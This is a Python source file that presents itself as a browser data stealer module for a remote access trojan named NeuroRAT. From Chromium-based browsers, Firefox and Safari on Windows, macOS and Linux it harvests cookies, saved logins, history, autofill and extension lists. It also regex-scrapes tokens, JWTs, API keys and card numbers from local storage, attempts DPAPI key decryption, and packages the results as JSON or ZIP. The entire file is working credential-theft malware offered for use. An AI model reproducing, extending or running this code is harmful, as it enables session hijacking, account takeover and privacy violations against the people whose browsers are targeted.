#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Browser Data Stealer Module for NeuroRAT
Author: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
License: MIT

This module extracts sensitive data from web browsers including:
- Cookies
- Saved passwords
- Browser history
- Autofill data
- Local storage data
"""

import os
import sys
import json
import sqlite3
import shutil
import base64
import re
import platform
import tempfile
from pathlib import Path
from datetime import datetime
import zipfile
import logging

# Try to import browser-specific decryption libraries
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import PBKDF2
except ImportError:
    pass

try:
    import win32crypt
except ImportError:
    pass

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("BrowserStealer")

# Regex patterns for sensitive data identification
PATTERNS = {
    'credit_card': r'\b(?:\d{4}[- ]?){3}\d{4}\b',
    'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    'api_key': r'[a-zA-Z0-9_-]{20,}',
    'access_token': r'(access|api|auth|client|session|secret)[-_]?(token|key|secret)?\s*[:=]\s*[\'"][a-zA-Z0-9_\-\.]{20,}[\'"]',
    'jwt': r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}',
    'password': r'(password|passwd|pwd)[:=]\s*[\'"][^\'"\s]{6,}[\'"]'
}

class BrowserStealer:
    """Extract sensitive data from various web browsers"""
    
    def __init__(self):
        self.os_type = platform.system().lower()
        self.output_dir = tempfile.mkdtemp(prefix="browser_data_")
        self.browser_paths = self._get_browser_paths()
        self.results = {
            "cookies": [],
            "passwords": [],
            "history": [],
            "autofill": [],
            "local_storage": [],
            "extensions": []
        }
    
    def _get_browser_paths(self):
        """Get paths to browser data based on operating system"""
        paths = {}
        
        if self.os_type == "windows":
            local_app_data = os.path.join(os.environ["LOCALAPPDATA"])
            roaming_app_data = os.path.join(os.environ["APPDATA"])
            
            paths = {
                "chrome": os.path.join(local_app_data, "Google", "Chrome", "User Data"),
                "edge": os.path.join(local_app_data, "Microsoft", "Edge", "User Data"),
                "brave": os.path.join(local_app_data, "BraveSoftware", "Brave-Browser", "User Data"),
                "firefox": os.path.join(roaming_app_data, "Mozilla", "Firefox", "Profiles"),
                "opera": os.path.join(roaming_app_data, "Opera Software", "Opera Stable"),
                "vivaldi": os.path.join(local_app_data, "Vivaldi", "User Data")
            }
            
        elif self.os_type == "darwin":  # macOS
            home = os.path.expanduser("~")
            
            paths = {
                "chrome": os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
                "edge": os.path.join(home, "Library", "Application Support", "Microsoft Edge"),
                "brave": os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"),
                "firefox": os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
                "safari": os.path.join(home, "Library", "Safari"),
                "opera": os.path.join(home, "Library", "Application Support", "com.operasoftware.Opera"),
                "vivaldi": os.path.join(home, "Library", "Application Support", "Vivaldi")
            }
            
        elif self.os_type == "linux":
            home = os.path.expanduser("~")
            
            paths = {
                "chrome": os.path.join(home, ".config", "google-chrome"),
                "chromium": os.path.join(home, ".config", "chromium"),
                "brave": os.path.join(home, ".config", "BraveSoftware", "Brave-Browser"),
                "firefox": os.path.join(home, ".mozilla", "firefox"),
                "opera": os.path.join(home, ".config", "opera"),
                "vivaldi": os.path.join(home, ".config", "vivaldi")
            }
        
        # Filter out non-existent paths
        return {k: v for k, v in paths.items() if os.path.exists(v)}
    
    def extract_all(self):
        """Extract all sensitive data from all browsers"""
        for browser_name, browser_path in self.browser_paths.items():
            logger.info(f"Extracting data from {browser_name}")
            
            try:
                if browser_name in ["chrome", "edge", "brave", "opera", "vivaldi", "chromium"]:
                    self._extract_chromium_data(browser_name, browser_path)
                elif browser_name == "firefox":
                    self._extract_firefox_data(browser_path)
                elif browser_name == "safari":
                    self._extract_safari_data(browser_path)
            except Exception as e:
                logger.error(f"Error extracting data from {browser_name}: {str(e)}")
        
        return self.results
    
    def _extract_chromium_data(self, browser_name, browser_path):
        """Extract data from Chromium-based browsers (Chrome, Edge, Brave, etc.)"""
        # Find all profiles
        profiles = ["Default"]
        profile_dir = os.path.join(browser_path, "Default")
        
        if os.path.exists(os.path.join(browser_path, "Local State")):
            # Try to get encryption key for passwords
            try:
                with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())
                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
                    
                    if encrypted_key:
                        encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove DPAPI prefix
                        if self.os_type == "windows" and win32crypt:
                            decryption_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                        elif self.os_type in ["darwin", "linux"]:
                            # Use system keyring on macOS/Linux
                            pass
                        
                        # With decryption_key, we could decrypt passwords
            except Exception as e:
                logger.error(f"Error getting encryption key: {str(e)}")
        
        # Get all profile directories
        for item in os.listdir(browser_path):
            if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_path, item)):
                profiles.append(item)
        
        # Extract data from each profile
        for profile in profiles:
            profile_path = os.path.join(browser_path, profile)
            
            # Extract cookies
            cookie_db = os.path.join(profile_path, "Network", "Cookies")
            if os.path.exists(cookie_db):
                try:
                    # Make a copy of the database to avoid lock
                    temp_cookie_db = os.path.join(self.output_dir, f"{browser_name}_{profile}_cookies.db")
                    shutil.copy2(cookie_db, temp_cookie_db)
                    
                    conn = sqlite3.connect(temp_cookie_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure FROM cookies")
                    
                    for row in cursor.fetchall():
                        self.results["cookies"].append({
                            "browser": browser_name,
                            "profile": profile,
                            "domain": row[0],
                            "name": row[1],
                            "value": row[2],
                            "path": row[3],
                            "expires": row[4],
                            "secure": bool(row[5])
                        })
                        
                    conn.close()
                    os.remove(temp_cookie_db)  # Clean up
                except Exception as e:
                    logger.error(f"Error extracting cookies from {browser_name} {profile}: {str(e)}")
            
            # Extract passwords
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                try:
                    temp_login_db = os.path.join(self.output_dir, f"{browser_name}_{profile}_login.db")
                    shutil.copy2(login_db, temp_login_db)
                    
                    conn = sqlite3.connect(temp_login_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        # Password is encrypted and would require the decryption key to decrypt
                        self.results["passwords"].append({
                            "browser": browser_name,
                            "profile": profile,
                            "url": row[0],
                            "username": row[1],
                            "password_encrypted": base64.b64encode(row[2]).decode("utf-8") if row[2] else ""
                        })
                        
                    conn.close()
                    os.remove(temp_login_db)  # Clean up
                except Exception as e:
                    logger.error(f"Error extracting passwords from {browser_name} {profile}: {str(e)}")
            
            # Extract history
            history_db = os.path.join(profile_path, "History")
            if os.path.exists(history_db):
                try:
                    temp_history_db = os.path.join(self.output_dir, f"{browser_name}_{profile}_history.db")
                    shutil.copy2(history_db, temp_history_db)
                    
                    conn = sqlite3.connect(temp_history_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
                    
                    for row in cursor.fetchall():
                        self.results["history"].append({
                            "browser": browser_name,
                            "profile": profile,
                            "url": row[0],
                            "title": row[1],
                            "visit_time": row[2]
                        })
                        
                    conn.close()
                    os.remove(temp_history_db)  # Clean up
                except Exception as e:
                    logger.error(f"Error extracting history from {browser_name} {profile}: {str(e)}")
            
            # Extract autofill data
            web_data_db = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data_db):
                try:
                    temp_web_data_db = os.path.join(self.output_dir, f"{browser_name}_{profile}_webdata.db")
                    shutil.copy2(web_data_db, temp_web_data_db)
                    
                    conn = sqlite3.connect(temp_web_data_db)
                    cursor = conn.cursor()
                    
                    # Autofill data
                    cursor.execute("SELECT name, value FROM autofill")
                    for row in cursor.fetchall():
                        self.results["autofill"].append({
                            "browser": browser_name,
                            "profile": profile,
                            "name": row[0],
                            "value": row[1]
                        })
                    
                    conn.close()
                    os.remove(temp_web_data_db)  # Clean up
                except Exception as e:
                    logger.error(f"Error extracting autofill data from {browser_name} {profile}: {str(e)}")
            
            # Extract local storage
            local_storage_path = os.path.join(profile_path, "Local Storage", "leveldb")
            if os.path.exists(local_storage_path):
                try:
                    for file in os.listdir(local_storage_path):
                        if file.endswith(".ldb"):
                            file_path = os.path.join(local_storage_path, file)
                            with open(file_path, "rb") as f:
                                content = f.read()
                                
                                # Look for patterns in content
                                for pattern_name, pattern in PATTERNS.items():
                                    try:
                                        matches = re.findall(pattern.encode(), content)
                                        if matches:
                                            for match in matches:
                                                self.results["local_storage"].append({
                                                    "browser": browser_name,
                                                    "profile": profile,
                                                    "type": pattern_name,
                                                    "value": match.decode("utf-8", errors="ignore"),
                                                    "file": file
                                                })
                                    except Exception:
                                        pass
                except Exception as e:
                    logger.error(f"Error extracting local storage from {browser_name} {profile}: {str(e)}")
            
            # Extract extension data
            extensions_path = os.path.join(profile_path, "Extensions")
            if os.path.exists(extensions_path):
                try:
                    for ext_id in os.listdir(extensions_path):
                        ext_dir = os.path.join(extensions_path, ext_id)
                        if os.path.isdir(ext_dir):
                            # Try to get extension info from manifest
                            manifest_path = None
                            
                            for version_dir in os.listdir(ext_dir):
                                potential_manifest = os.path.join(ext_dir, version_dir, "manifest.json")
                                if os.path.exists(potential_manifest):
                                    manifest_path = potential_manifest
                                    break
                            
                            if manifest_path:
                                try:
                                    with open(manifest_path, "r", encoding="utf-8") as f:
                                        manifest = json.loads(f.read())
                                        
                                        self.results["extensions"].append({
                                            "browser": browser_name,
                                            "profile": profile,
                                            "id": ext_id,
                                            "name": manifest.get("name", "Unknown"),
                                            "version": manifest.get("version", "Unknown"),
                                            "description": manifest.get("description", "")
                                        })
                                except:
                                    self.results["extensions"].append({
                                        "browser": browser_name,
                                        "profile": profile,
                                        "id": ext_id,
                                        "name": "Unknown",
                                        "version": "Unknown",
                                        "description": ""
                                    })
                except Exception as e:
                    logger.error(f"Error extracting extensions from {browser_name} {profile}: {str(e)}")
    
    def _extract_firefox_data(self, firefox_path):
        """Extract data from Firefox browser"""
        # Find all profiles
        profiles = []
        
        # Handle multiple profile structures
        if os.path.exists(os.path.join(firefox_path, "profiles.ini")):
            # Read profiles from profiles.ini
            try:
                with open(os.path.join(firefox_path, "profiles.ini"), "r") as f:
                    for line in f:
                        if line.startswith("Path="):
                            profile_path = line.split("=")[1].strip()
                            profiles.append(profile_path)
            except:
                pass
        
        # If no profiles found through profiles.ini, look for directories
        if not profiles:
            for item in os.listdir(firefox_path):
                if os.path.isdir(os.path.join(firefox_path, item)) and (item.endswith(".default") or ".default-" in item):
                    profiles.append(item)
        
        # Process each profile
        for profile in profiles:
            profile_path = os.path.join(firefox_path, profile)
            if not os.path.isdir(profile_path):
                continue
            
            # Extract cookies
            cookies_db = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookies_db):
                try:
                    temp_cookies_db = os.path.join(self.output_dir, f"firefox_{profile}_cookies.db")
                    shutil.copy2(cookies_db, temp_cookies_db)
                    
                    conn = sqlite3.connect(temp_cookies_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
                    
                    for row in cursor.fetchall():
                        self.results["cookies"].append({
                            "browser": "firefox",
                            "profile": profile,
                            "domain": row[0],
                            "name": row[1],
                            "value": row[2],
                            "path": row[3],
                            "expires": row[4],
                            "secure": bool(row[5])
                        })
                        
                    conn.close()
                    os.remove(temp_cookies_db)  # Clean up
                except Exception as e:
                    logger.error(f"Error extracting cookies from Firefox {profile}: {str(e)}")
            
            # Extract login data
            logins_path = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, "r", encoding="utf-8") as f:
                        logins_data = json.loads(f.read())
                        
                        for login in logins_data.get("logins", []):
                            self.results["passwords"].append({
                                "browser": "firefox",
                                "profile": profile,
                                "url": login.get("hostname", ""),
                                "username": login.get("encryptedUsername", ""),
                                "password_encrypted": login.get("encryptedPassword", "")
                            })
                except Exception as e:
                    logger.error(f"Error extracting logins from Firefox {profile}: {str(e)}")
            
            # Extract history
            places_db = os.path.join(profile_path, "places.sqlite")
            if os.path.exists(places_db):
                try:
                    temp_places_db = os.path.join(self.output_dir, f"firefox_{profile}_places.db")
                    shutil.copy2(places_db, temp_places_db)
                    
                    conn = sqlite3.connect(temp_places_db)
                    cursor = conn.cursor()
                    cursor.execute("""
                    SELECT url, title, last_visit_date 
                    FROM moz_places 
                    ORDER BY last_visit_date DESC 
                    LIMIT 500
                    """)
                    
                    for row in cursor.fetchall():
                        self.results["history"].append({
                            "browser": "firefox",
                            "profile": profile,
                            "url": row[0],
                            "title": row[1],
                            "visit_time": row[2]
                        })
                        
                    conn.close()
                    os.remove(temp_places_db)  # Clean up
                except Exception as e:
                    logger.error(f"Error extracting history from Firefox {profile}: {str(e)}")
            
            # Extract form history (autofill)
            formhistory_db = os.path.join(profile_path, "formhistory.sqlite")
            if os.path.exists(formhistory_db):
                try:
                    temp_formhistory_db = os.path.join(self.output_dir, f"firefox_{profile}_formhistory.db")
                    shutil.copy2(formhistory_db, temp_formhistory_db)
                    
                    conn = sqlite3.connect(temp_formhistory_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT fieldname, value FROM moz_formhistory")
                    
                    for row in cursor.fetchall():
                        self.results["autofill"].append({
                            "browser": "firefox",
                            "profile": profile,
                            "name": row[0],
                            "value": row[1]
                        })
                        
                    conn.close()
                    os.remove(temp_formhistory_db)  # Clean up
                except Exception as e:
                    logger.error(f"Error extracting form history from Firefox {profile}: {str(e)}")
            
            # Extract extensions
            extensions_path = os.path.join(profile_path, "extensions")
            if os.path.exists(extensions_path):
                try:
                    for ext_file in os.listdir(extensions_path):
                        ext_id = ext_file.split(".xpi")[0]
                        self.results["extensions"].append({
                            "browser": "firefox",
                            "profile": profile,
                            "id": ext_id,
                            "name": ext_id,  # Without unpacking XPI, we can't get the name easily
                            "version": "Unknown",
                            "description": ""
                        })
                except Exception as e:
                    logger.error(f"Error extracting extensions from Firefox {profile}: {str(e)}")
    
    def _extract_safari_data(self, safari_path):
        """Extract data from Safari browser (macOS only)"""
        if self.os_type != "darwin":
            return
        
        # Extract cookies
        cookies_path = os.path.join(safari_path, "Cookies.binarycookies")
        if os.path.exists(cookies_path):
            logger.info("Safari cookies found, but binary format parsing not implemented")
            # Binary cookies format parsing would be needed
        
        # Extract history
        history_db = os.path.join(os.path.expanduser("~"), "Library", "Safari", "History.db")
        if os.path.exists(history_db):
            try:
                temp_history_db = os.path.join(self.output_dir, "safari_history.db")
                shutil.copy2(history_db, temp_history_db)
                
                conn = sqlite3.connect(temp_history_db)
                cursor = conn.cursor()
                cursor.execute("""
                SELECT history_items.url, history_visits.visit_time 
                FROM history_items 
                INNER JOIN history_visits ON history_items.id = history_visits.history_item 
                ORDER BY history_visits.visit_time DESC LIMIT 500
                """)
                
                for row in cursor.fetchall():
                    self.results["history"].append({
                        "browser": "safari",
                        "profile": "default",
                        "url": row[0],
                        "title": "",
                        "visit_time": row[1]
                    })
                    
                conn.close()
                os.remove(temp_history_db)  # Clean up
            except Exception as e:
                logger.error(f"Error extracting history from Safari: {str(e)}")
    
    def save_results(self, output_path=None):
        """Save the extracted data to a JSON file"""
        if not output_path:
            output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
                                      f"browser_data_{datetime.now().strftime('%Y%m%d%H%M%S')}.json")
        
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(self.results, f, indent=4)
            
            return output_path
        except Exception as e:
            logger.error(f"Error saving results: {str(e)}")
            return None
    
    def zip_results(self, output_path=None):
        """Save the extracted data to a ZIP file"""
        if not output_path:
            output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 
                                      f"browser_data_{datetime.now().strftime('%Y%m%d%H%M%S')}.zip")
        
        try:
            with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                # Write results as JSON
                json_data = json.dumps(self.results, indent=4)
                zipf.writestr("browser_data.json", json_data)
                
                # Log the operation
                logger.info(f"Browser data saved to {output_path}")
            
            return output_path
        except Exception as e:
            logger.error(f"Error zipping results: {str(e)}")
            return None
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.output_dir)
        except Exception as e:
            logger.error(f"Error cleaning up temporary files: {str(e)}")

def run_stealer(output_format="json"):
    """
    Run the browser stealer module and return the results
    
    Args:
        output_format (str): Format to save the results ('json' or 'zip')
        
    Returns:
        dict: Results dictionary or path to the saved file
    """
    try:
        stealer = BrowserStealer()
        results = stealer.extract_all()
        
        # Save results based on specified format
        if output_format.lower() == "json":
            output_path = stealer.save_results()
        elif output_format.lower() == "zip":
            output_path = stealer.zip_results()
        else:
            output_path = None
        
        # Clean up temporary files
        stealer.cleanup()
        
        if output_path:
            logger.info(f"Browser data saved to {output_path}")
            return {"success": True, "output_path": output_path, "data": results}
        else:
            return {"success": True, "data": results}
            
    except Exception as e:
        logger.error(f"Error running browser stealer: {str(e)}")
        return {"success": False, "error": str(e)}

if __name__ == "__main__":
    # If run directly, execute the stealer
    result = run_stealer("json")
    print(f"Browser stealer completed: {result['success']}")
    if result.get("output_path"):
        print(f"Results saved to: {result['output_path']}") 